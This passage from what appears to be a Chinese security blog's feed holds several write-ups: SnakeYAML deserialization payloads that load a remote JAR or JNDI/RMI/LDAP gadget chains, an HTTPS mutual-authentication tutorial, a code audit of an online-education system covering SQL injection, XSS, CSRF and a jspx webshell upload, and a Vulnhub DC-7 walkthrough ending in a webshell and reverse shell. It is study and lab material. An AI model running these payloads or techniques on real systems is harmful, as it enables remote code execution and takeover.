atrule">namespace</span><span class="token punctuation">:</span> <span class="token tag">!!javax.script.ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token tag">!!java.net.URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token tag">!!java.net.URL</span> <span class="token punctuation">[</span><span class="token string">"http://127.0.0.1:9999/payload.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token key atrule">set</span><span class="token punctuation">:</span> test    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功执行命令，经过测试，只需要控制yml文件中的value或者key值即可进行命令执行。</p><img src="/snakeyaml/41.png" class=""><p>经过调试发现，传入的yaml字符串会生成map对象，yaml.load逻辑上是对map中的key、value值进行依次解析。</p><img src="/snakeyaml/42.png" class=""><img src="/snakeyaml/43.png" class=""><p>经测试fastjson格式也支持。此处vaule部分不需要加双引号否则无法命令执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">{</span><span class="token string">"tst"</span><span class="token operator">:</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span> <span class="token punctuation">[</span><span class="token string">"http://127.0.0.1:9999/payload.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/snakeyaml/46.png" class=""><h1 id="LoadAs反序列化漏洞分析"><a href="#LoadAs反序列化漏洞分析" class="headerlink" title="LoadAs反序列化漏洞分析"></a>LoadAs反序列化漏洞分析</h1><h2 id="指定类包含有参构造函数"><a href="#指定类包含有参构造函数" class="headerlink" title="指定类包含有参构造函数"></a>指定类包含有参构造函数</h2><p>yaml.loadAs()中已经指定待反序列化对象的类型。直接使用payload进行反序列报错。</p><p>发现执行报错点在org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct方法中</p><img src="/snakeyaml/33.png" class=""><p>跟进yaml.loadAs方法中的type在哪里起作用。</p><img src="/snakeyaml/34.png" class=""><p>可知，当type不为Object时，node的Tag标签会被设置成指定的类。由前面分析可知，Tag标签表示最终需要实例化的类，所以此处javax.script.ScriptEngineManager的类会被实例化为Student类，从而导致无法执行命令。</p><img src="/snakeyaml/35.png" class=""><p>进一步证实，查看node.setTag()后的node对象的值。可看出，最外层的tag直接为Student类，明显此处是直接替换了javax.script.ScriptEngineManager类，而后面的payload并没有发生变化。</p><img src="/snakeyaml/36.png" class=""><p>所以，此处想到何不在直接在最外层再套一层类，使ScriptEngineManager类在内层就执行。</p><p>构造paylaod:     </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span> <span class="token punctuation">[</span>\"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">9999</span><span class="token operator">/</span>payload<span class="token punctuation">.</span>jar\"<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>                                                                                                    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>传入此payload，报错并没有执行命令。查看报错原因，大致意思是没有发现Student类一个参数的构造函数。此时反应过来，Student类只设置了无参构造函数，和两个参数的构造函数，所以需要符合构造参数的传参。</p><img src="/snakeyaml/37.png" class=""><p>增加一个参数后的payload。</p><pre class="line-numbers language-none"><code class="language-none">!!java.lang.String [!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:9999/payload.jar\"]]]],test]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功执行命令。</p><img src="/snakeyaml/38.png" class=""><h2 id="指定类只有无参构造函数"><a href="#指定类只有无参构造函数" class="headerlink" title="指定类只有无参构造函数"></a>指定类只有无参构造函数</h2><p>仔细思考，发现上述方法只有当指定反序列化类有一个或一个以上的参数构造函数时，loadAs才能触发命令执行，当指定类只有无参构造函数时呢？所以继续进行探索。</p><p>将Student类中的有参构造函数注释掉，只留无参构造函数。</p><img src="/snakeyaml/44.png" class=""><p>POC</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">name<span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span> <span class="token punctuation">[</span><span class="token string">"http://127.0.0.1:9999/payload.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此处的name为Student类的属性，因为类的在实例化时会加载属性，加载属性时也会对!!后的字符进行强制类型转化。</p><p>若此字符串不为类属性时，会在此处报错而不进行后续操作。</p><img src="/snakeyaml/45.png" class=""><h1 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h1><p>snakeyaml反序列化漏洞和fastjson反序列化漏洞相似，所以部分利用链可参考fastjson漏洞链</p><h2 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h2><p>payload:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token string">"!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \"rmi://127.0.0.1:1099/Exploit\", autoCommit: true}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用链</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">JdbcRowSetImpl</span>#setAutoCommit    <span class="token class-name">JdbcRowSetImpl</span>#connect        <span class="token class-name">InitialContext</span>#lookup    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此处原理：yaml.load反序列化时会调用private修饰的属性的set方法。即会调用setdataSourceName、setAutocommint方法。</p><h2 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n"</span> <span class="token operator">+</span>                 <span class="token string">" targetBeanName: \"ldap://127.0.0.1:1389/Exploit\"\n"</span> <span class="token operator">+</span>                 <span class="token string">" propertyPath: Red6380\n"</span> <span class="token operator">+</span>                 <span class="token string">" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n"</span> <span class="token operator">+</span>                 <span class="token string">"  shareableResources: [\"ldap://127.0.0.1:1389/Exploit\"]"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n"</span> <span class="token operator">+</span>                  <span class="token string">"  jndiName: \"rmi://127.0.0.1/Exploit\"\n"</span> <span class="token operator">+</span>                  <span class="token string">"  loginTimeout: 0"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="snakeyaml反序列漏洞修复"><a href="#snakeyaml反序列漏洞修复" class="headerlink" title="snakeyaml反序列漏洞修复"></a>snakeyaml反序列漏洞修复</h1><ul><li>加入new SafeConstructor()类进行过滤。此方法通过白名单的方式规定了哪些类可以进行反序列化。</li></ul><p>加入过滤器进行反序列化恶意类会报错。</p><img src="/snakeyaml/39.png" class=""><p>SafeConstructor类中定义的可反序列化的类。</p><img src="/snakeyaml/40.png" class=""><ul><li>禁止Yaml.load()函数参数外部可控。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>控制yaml字符串中的key或者vaule部分即可命令执行。</li><li>yaml.loadAs也可以造成反序列化漏洞，使用指定类的有参构造函数或者属性值构造相应的payload即可。</li><li>snkayaml分析列化漏洞与fastjson相似，所以可以在fastjson利用链中寻找利用链。</li></ul><p>参考资料</p><ul><li><p><a href="https://drun1baby.github.io/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/#toc-heading-17">https://drun1baby.github.io/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/#toc-heading-17</a></p></li><li><p><a href="http://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">http://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>https与双向认证</title>
      <link href="/https/"/>
      <url>/https/</url>
      
        <content type="html"><![CDATA[<h1 id="https基础知识"><a href="#https基础知识" class="headerlink" title="https基础知识"></a><strong>https基础知识</strong></h1><p>​            HTTPS 协议是由HTTP 加上TLS/SSL 协议构建的可进行加密传输、身份认证的网络协议，主要通过数字证书、加密算法、非对称密钥等技术完成互联网数据传输加密，实现互联网传输安全保护。</p><p>​            SSL v1.0 、V2.0、V3.0是较早期使用的，TLS是现在使用的，是由SSL发展而来的。由于协议版本漏洞的原因，现在主要是使用TLS v1.1、TLS v1.2版本进行加密。TLS v1.3由于改动比较大，使用的还教少。</p><img src="/https/01.png" class=""><h1 id="HTTPS协议握手"><a href="#HTTPS协议握手" class="headerlink" title="HTTPS协议握手"></a>HTTPS协议握手</h1><p>​            开启wireshark进行抓包后，命令行执行 <code>curl  https://www.baidu.com</code>（使用curl可以避免产生多余的数据包，也可使用浏览器访问，但是会加载许多资源）。</p><ul><li><p>第一步：TCP三次握手。</p><img src="/https/11.png" class=""></li><li><p>第二步：客户端发送Client Hello。</p><img src="/https/02.png" class=""></li></ul><ul><li><p>第三步：服务端发送 Server Hello。</p><img src="/https/03.png" class=""></li></ul><ul><li><p>第三步：服务端发送证书 Certificate、Server Key Exchange、Server Hello Done。</p><img src="/https/12.png" class=""></li><li><p>第四步：客户端发送 Client Key Exchage、Change Cipher Spec、Encrypted Handshake Message。</p><img src="/https/07.png" class=""></li></ul><ul><li><p>第五步： 服务端发送 New Session Ticket、Change Cipher Spec、Encrypted Handshake Message。</p><img src="/https/08.png" class=""></li></ul><ul><li><p>第六步：完成秘钥协商，开始发送数据。</p><img src="/https/10.png" class=""></li><li><p>第七步：完成数据发送，4次TCP挥手。（此处的 Encrypted Alert / ACK 为SSL/TLS的挥手）</p><img src="/https/13.png" class=""></li></ul><p>使用<code>openssl s_client -connect IP:port</code>命令可查看连接网站的证书详情。</p><img src="/https/14.png" class=""><img src="/https/15.png" class=""><h1 id="证书生成"><a href="#证书生成" class="headerlink" title="证书生成"></a>证书生成</h1><ul><li><p>第一步：生成ca证书ca_cert.crt 。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl req <span class="token parameter variable">-newkey</span> rsa:2048 <span class="token parameter variable">-nodes</span> <span class="token parameter variable">-keyout</span> ca_key.key <span class="token parameter variable">-x509</span> <span class="token parameter variable">-days</span> <span class="token number">365</span> <span class="token parameter variable">-out</span> ca_cert.crt <span class="token parameter variable">-subj</span> <span class="token string">"/C=CN/ST=GD/L=SZ/O=test/OU=dev/CN=ca.com/emailAddress=ca@ca.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-newkey rsa:2048 -nodes -keyout：表示生成不加密的私钥；</p><p>CN值为域名。</p></li><li><p>第二步：生成服务端私钥server_key.key和证书server.crt。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//生成私钥。openssl genrsa <span class="token parameter variable">-out</span> server_key.key <span class="token number">2048</span>//生成请求文件。openssl req <span class="token parameter variable">-new</span> <span class="token parameter variable">-key</span> server_key.key <span class="token parameter variable">-out</span> server.csr <span class="token parameter variable">-subj</span> <span class="token string">"/C=CN/ST=GD/L=SZ/O=test/OU=dev/CN=server.com/emailAddress=server@server.com"</span>//生成证书文件。openssl x509 <span class="token parameter variable">-req</span> <span class="token parameter variable">-days</span> <span class="token number">3650</span> <span class="token parameter variable">-in</span> server.csr <span class="token parameter variable">-CA</span> ca_cert.crt <span class="token parameter variable">-CAkey</span> ca_key.key <span class="token parameter variable">-CAcreateserial</span> <span class="token parameter variable">-out</span> server.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第三步：生成客户端私钥client_key.key和证书client.crt。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//生成私钥。openssl genrsa <span class="token parameter variable">-out</span> client_key.key <span class="token number">2048</span>//生成请求文件。openssl req <span class="token parameter variable">-new</span> <span class="token parameter variable">-key</span> client_key.key <span class="token parameter variable">-out</span> client.csr <span class="token parameter variable">-subj</span> <span class="token string">"/C=CN/ST=GD/L=SZ/O=test/OU=dev/CN=client.com/emailAddress=client@client.com"</span>//生成证书文件。openssl x509 <span class="token parameter variable">-req</span> <span class="token parameter variable">-days</span> <span class="token number">3650</span> <span class="token parameter variable">-in</span> client.csr <span class="token parameter variable">-CA</span> ca_cert.crt <span class="token parameter variable">-CAkey</span> ca_key.key <span class="token parameter variable">-CAcreateserial</span> <span class="token parameter variable">-out</span> client.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="单向证书认证"><a href="#单向证书认证" class="headerlink" title="单向证书认证"></a>单向证书认证</h1><p>此处使用phpstudy中的nginx进行证书配置。打开nginx目录下的nginx.conf配置。</p><img src="/https/16.png" class=""><p>然后本地点击ca_cert.crt证书进行本地安装即可。</p><img src="/https/19.png" class=""><p>本地使用HTTPS协议访问成功。</p><img src="/https/18.png" class=""><h1 id="双向证书认证"><a href="#双向证书认证" class="headerlink" title="双向证书认证"></a>双向证书认证</h1><p>nginx开启双向认证配置。</p><img src="/https/20.png" class=""><p>此时浏览器访问出现400，显示未发送证书。此时需要携带客户端证书。</p><p>需要把client.crt与client_key.key转化为.p12格式的证书再导入浏览器中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//此处需要输入密码对证书进行加密，后续导入浏览器中需要使用此密码openssl pkcs12 <span class="token parameter variable">-export</span> <span class="token parameter variable">-in</span> client.crt <span class="token parameter variable">-inkey</span> client_key.key <span class="token parameter variable">-out</span> client.p12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将client.p12证书导入浏览器中即可。</p><img src="/https/22.png" class=""><p>此时重新访问时选择导入的证书访问即可成功。</p><img src="/https/18.png" class=""><p>也可使用curl命令进行访问。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//此处的server.com为证书生成时服务端的CN域名值。//需要本地配置C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts文件。<span class="token function">curl</span> <span class="token parameter variable">--cert</span> client.crt <span class="token parameter variable">--key</span> client_key.key <span class="token parameter variable">--cacert</span> ca_cert.crt https://server.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/https/23.png" class="">]]></content>
      
      
      <categories>
          
          <category> https </category>
          
          <category> 协议 </category>
          
          <category> 证书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> https </tag>
            
            <tag> 协议 </tag>
            
            <tag> 证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计项目--indedu因酷在线教育开源系统</title>
      <link href="/inxedu/"/>
      <url>/inxedu/</url>
      
        <content type="html"><![CDATA[<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a><strong>环境</strong>部署</h1><ol><li><p><a href="https://down.chinaz.com/soft/38604.htm">下载源代码</a>，使用IDEA进行部署，项目pom.xml进行maven依赖包添加、配置数据库账号密码、配置开启端口后即可使用tomcat7插件运行项目。</p></li><li><p>搭建过程遇见两个坑点：</p><ul><li><p>mysql建议直接使用5.5.*版本的，高版本的会因为mysql的默认配置需要额外配置而遇见各种问题，虽然最后都能搭建成功，但是直接使用低版本的就无需额外配置。</p></li><li><p>项目路径建议直接使用 <a href="http://IP:port">http://IP:port</a> 形式，后面不要配置额外的路径，加入额外项目配置后虽然可以部署成功，但是会导致一些页面或者图片加载不成功。</p></li></ul></li><li><p>进行代码审计时，记得需要额外把\src\main\webapp\WEB-INF\lib\目录下的jar包反编译后再进行代码审计，因为使用IDEA进行源码关键字搜索时不会搜索jar包中的代码，我审计之前就没有注意到项目下的这个目录，导致前面审计过程中某些功能找不到源代码。</p><img src="/inxedu/01.png" class=""></li></ol><h1 id="项目结构分析"><a href="#项目结构分析" class="headerlink" title="项目结构分析"></a><strong>项目结构分析</strong></h1><p>这是一个SSM（即Spring Framework、Spring MVC、MyBatis）架构项目。</p><p><a href="https://baike.baidu.com/item/SSM/18801167">百科</a>是这样介绍的：</p><img src="/inxedu/02.png" class=""><ul><li><p>pom.xml：审计maven项目首先应该查看pom.xm，通过查看此文件可以知道项目用了哪些组件及组件版本，这样可以快速查看组件对应的版本是否有漏洞。</p><ul><li>观察到项目使用了log4j 且版本为1.2.17，此版本存在反序列化漏洞CVE-2019-17571（经过分析，不存在此漏洞，因为本项目未使用产生此漏洞的类即SocketNode类）。</li><li>还使用了druid 1.0.1 组件，可以找一些未授权接口（经过测试未发现此组件产生的未授权）。</li><li>mybatis 3.2.7 组件存在反序列化漏洞CVE-2020-26945（经过分析，不存在此漏洞，因为此项目未开启mybatis二级缓存功能）。</li></ul><img src="/inxedu/03.png" class=""></li><li><p>web.xml：程序启动时会先加载这个文件，此文件用来配置Filter、Listener、Servlet。此文件需要重点关注Filter过滤器的全局配置。</p><p>​        此项目只配置了两个全局的过滤器且这两个过滤器都未对输入输出进行转义之类的字符处理，所以未配置全局的XSS过滤。</p><img src="/inxedu/04.png" class=""></li><li><p>applicationContext.xml： spring的默认配置文件，当容器启动时找不到其他指定配置文档时，将加载这个配置文件，此文件也包含引用其他的配置文件。</p><img src="/inxedu/05.png" class=""></li><li><p>spring-mvc.xml：此文件主要的工作是：启动注解、扫描controller包注解；静态资源映射；视图解析（defaultViewResolver）；文件上传（multipartResolver）;返回消息json配置。</p><img src="/inxedu/06.png" class=""><p>   web项目启动时，读取web.xml配置文件，首先解析的是applicationContext.xml文件，其次才是sping-mvc.xml文件。</p></li></ul><ul><li><p>Interceptor：拦截器，用于拦截用户请求并进行相应的处理。比如通过它来进行权限验证，或者是来判断用户是否登陆，或者是像12306 那样子判断当前时间是否是购票时间。</p><p>  此项目有3个拦截器，分别对前台用户、后台用户、网站配置管理处的用户是否登录与权限做相应处理。</p></li></ul><img src="/inxedu/07.png" class=""><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="前台找回密码处验证码重复利用"><a href="#前台找回密码处验证码重复利用" class="headerlink" title="前台找回密码处验证码重复利用"></a>前台找回密码处验证码重复利用</h2><p>​    直接在代码中搜索关键字验证码，对相关代码进行分析。</p><p>​    此处是找回密码功能，先后获取客户端与服务端验证码进行校验，校验成功后进入校验邮箱是否注册，若未注册则直接返回结果，未删除服务端中的旧验证码，所以此处可对验证码重复使用来爆破出已经注册的邮箱。</p><img src="/inxedu/09.png" class=""><p>​    继续分析可知，邮箱存在且重置密码之后才清除服务端中的验证码。因为前台登录处无验证码，所以此处可配合登录处继续密码爆破。</p><img src="/inxedu/10.png" class=""><p>​    但是经过分析，后台管理员登录处就不存在验证码重复利用，因为验证码校验正确后就会立马进行清除。</p><img src="/inxedu/11.png" class=""><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>​    开头已经分析未发现全局的XSS过滤器，所以直接注册账号进行登录，见框就插入XSS payload。</p><p>​    在问答功能下的我要提问功能处发现存储型XSS。</p><img src="/inxedu/12.png" class=""><img src="/inxedu/13.png" class=""><p>此处只有标题有XSS而内容无XSS，找到对应的入口进行分析原因，questionsService.addQuestions()为添加问答方法，追踪此方法</p><p><code> QuestionsController--&gt;QuestionsService--&gt;QuestionsServiceImpl--&gt;QuestionsDao--&gt;QuestionsDaoImpl--&gt;QuestionsMapper</code></p><p>根据追踪过程分析未做字符过滤就直接保存到数据库中。并且标题和内容都保存数据库中。</p><img src="/inxedu/14.png" class=""><img src="/inxedu/15.png" class=""><p>​    由此可知，存储过程标题和内容未做差异化处理，说明在输出的时候对内容进行了过滤，继续分析输出部分。由以上可知,存在XSS的url为<code>http://127.0.0.1:8080/question/list</code>。</p><p>​    直接在*.jsp文件中搜索question/list找到对应的输出点。很明显标题处是直接拼接数据库中的值并未使用标签包裹，而内容处则使用了<code>&lt;c:out&gt;</code>标签。在jsp文件中，使用<code>&lt;c:out&gt;</code>标签是直接对代码进行输出而不当成js代码执行。</p><img src="/inxedu/16.png" class=""><p>​    </p><p>​    自此，产生XSS的来龙去脉都已经知道了，所以输出变量时，没有使用&lt;c:out&gt;标签进行防护的都会产生XSS，经分析其他还有多处有XSS。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>​    因为使用的时mybatis框架，所以直接在*Mapper.xml文件中搜索<code>${</code>即可。</p><p>​    发现存在多处使用<code>${}</code>进行拼接的地方，选择一处进行分析</p><img src="/inxedu/17.png" class=""><p>​    找到对应的controller层入口。此处为后台管理员用户删除文章功能处。</p><img src="/inxedu/18.png" class=""><p>​    </p><p>​    抓取请求包直接使用sqlmap爆破即可。</p><img src="/inxedu/19.png" class=""><p>​    </p><p>​    其他还有几处也存在sql注入。类似分析即可。有几处因为是直接拼接路径中的字符作为参数的，所以这种情况即使使用${}也不会造成sql注入</p><h2 id="前台用户横向越权"><a href="#前台用户横向越权" class="headerlink" title="前台用户横向越权"></a>前台用户横向越权</h2><p>​    在用户修改个人资料时，直接抓包修改 user.userId参数值即可越权登录到其他存在的用户。</p><img src="/inxedu/20.png" class=""><p>​    分析代码可知，未对用户进行判断就直接把用户信息更新到数据库中，更新数据库中后直接使用userid进行自动重新登录从而可导致直接登录其他用户界面。</p><img src="/inxedu/21.png" class=""><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>​    后台管理员创建用户处存在CSRF漏洞，攻击者可结合此系统的XSS漏洞构造恶意代码从而导致创建系统管理员用户。</p><img src="/inxedu/22.png" class=""><p>​    </p><p>​    可用burpsuite自带的CSRF工具生成payload进行测试。</p><img src="/inxedu/24.png" class=""><p>​    从代码处可知，未对请求体校验Referer字段，也无token机制。因此可造成CSRF。</p><img src="/inxedu/23.png" class=""><h2 id="前台文件上传getshell"><a href="#前台文件上传getshell" class="headerlink" title="前台文件上传getshell"></a>前台文件上传getshell</h2><p>​    前置知识点</p><p>​    jspx：以xml语法来书写jsp的文件，自定义的映射类型，jspx=jsp+xml；jspx文件本身符合xml的规范，但是它本质又是一个jsp文件，所以在所有jsp里面能够做到的事情在jspx里同样可以做到。</p><p>​    tomcat的web.xml中org.apache.jasper.servlet.Jspservlet配置关于jsp服务的解析，默认是都会解析jsp和jspx。</p><img src="/inxedu/26.png" class=""><p>​    此处漏洞发生在前台用户上传头像处。</p><img src="/inxedu/25.png" class=""><p>直接找到源代码进行分析，源码在\src\main\webapp\WEB-INF\lib\inxedu-jar.jar包中。</p><p>此处的fileType即为前端传入的文件类型后缀，分析代码可知，此处只过滤了jsp文件其他文件可随意上传，可以上传html文件造成XSS漏洞，由于此项目使用tomcat，所以可以上传jspx文件getshell。</p><img src="/inxedu/27.png" class=""><p>​    </p><p>​    使用哥斯拉工具生成jspx木马上传文件，上传成功。</p><img src="/inxedu/28.png" class=""><p>​    连接成功。</p><img src="/inxedu/29.png" class="">]]></content>
      
      
      <categories>
          
          <category> java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC7靶场详解</title>
      <link href="/dc7/"/>
      <url>/dc7/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC7靶场</li><li>VMware虚拟机</li><li>kali  </li></ol><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h1><p>由目标靶机的MAC地址得到目标IP为192.168.137.103，直接nmap扫描。   </p><img src="/dc7/053002.png" class="">    <p>可以知道目标开放了80和22端口，直接进入网站。    </p><img src="/dc7/053003.png" class="">    <p>进入网站发现CMS是drupal 8，在漏洞进行搜索，无果。所以只能查看网站。翻译一下首页的内容。     </p><blockquote><p>欢迎来到DC-7<br>DC-7引入了一些“新”概念，但我将让您弄清楚它们是什么。 :-)<br>尽管此挑战并不是技术性的全部，但如果您需要诉诸于暴力破解或字典攻击，您可能不会成功。<br>您将要做的就是在盒子外面思考。<br>方式在盒子外面。 :-)    </p></blockquote><p>通过翻译内容得知，线索在外部，观察过后发现首页下面有<code>@DC7USER</code>的标志有点可疑，所以直接用搜索引擎搜索。    </p><img src="/dc7/053004.png" class="">    <p>可以github上有资源，所以进入查看。   </p><img src="/dc7/053005.png" class="">     <p>在仓库下发现账号密码，登陆发现失败，于是尝试ssh连接，连接成功。    </p><img src="/dc7/053006.png" class="">    <p>在/home/dc7user下发现两个文件。   </p><img src="/dc7/053007.png" class="">     <p>在mbox下发现了线索，由内容可以知道这是root用户发给dc7user用户的一封邮箱，并且会以root权限定时执行<code>/opt/scripts/backups.sh</code>脚本。   </p><img src="/dc7/053009.png" class="">     <p>由内容得知，只是执行一些命令，drush命令是drupal系统中特定的管理工具。由于脚本执行是root权限，所以只要把反弹shell命令写入该脚本即可得到root权限。可以知道www-data用户即网站用户对该脚本具有写入权限。所以现在需要拿到网站的反弹shell。   </p><p>查阅drush相关命令得知<code>drush user-password 用户名 --password="密码"</code>可以修改密码。drupal网站的有默认用户为admin，所以可以更改admin的密码。    </p><img src="/dc7/053010.png" class="">    <h1 id="安装插件拿shell"><a href="#安装插件拿shell" class="headerlink" title="安装插件拿shell"></a><strong>安装插件拿shell</strong></h1><p>由/opt/scripts/backups脚本知，需要进入/var/www/html文件下执行drush命令。修改密码成功。admin/123.com登陆网站成功。    </p><img src="/dc7/053011.png" class="">   <p>发现可以写入一个网页，但是网页类型没有PHP模式，所以需要下载一个PHP代码的插件即可。<br>php插件下载<a href="http://drupal.org/project/php">http://drupal.org/project/php</a>.    </p><img src="/dc7/053012.png" class="">     <p>将下载好的压缩包文件进行安装即可    </p><img src="/dc7/053013.png" class="">       <p>再把安装好的插件进行选择即可。    </p><img src="/dc7/053015.png" class="">     <p>将小马写入首页即可。蚁剑连接。连接成功。反弹shell到kali。     </p><img src="/dc7/053016.png" class="">      <p>反弹成功。    </p><img 